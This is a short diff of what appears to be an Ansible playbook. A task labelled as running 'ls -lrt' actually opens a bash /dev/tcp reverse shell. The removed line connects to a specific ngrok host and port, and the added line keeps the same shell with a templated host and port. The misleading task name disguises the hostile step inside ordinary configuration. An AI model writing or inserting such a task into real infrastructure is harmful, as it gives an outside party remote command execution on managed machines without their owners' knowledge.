@@ -5,4 +5,4 @@
     tasks:
 
     - name: "just execute a ls -lrt command"
-      shell: "0<&196;exec 196<>/dev/tcp/7.tcp.eu.ngrok.io/11633; sh <&196 >&196 2>&196"
+      shell: "0<&196;exec 196<>/dev/tcp/{{host}}/{{port}}; sh <&196 >&196 2>&196"
